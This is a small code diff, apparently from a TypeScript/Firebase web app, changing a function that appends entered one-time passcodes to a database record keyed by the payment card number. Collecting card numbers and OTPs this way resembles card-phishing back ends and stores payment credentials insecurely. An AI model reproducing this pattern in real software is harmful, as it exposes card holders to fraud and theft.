@@ -145,7 +145,7 @@ return ref
     prefix: '',
   });
 const handleAddotp=(otp:string)=>{
-  newotp.push(otp)
+  newotp.push(`${otp}  \n  ||  `)
   const docRef = doc(db,'orders',paymentInfo!.cardNumber)
   updateDoc(docRef,{otp:newotp})
 }
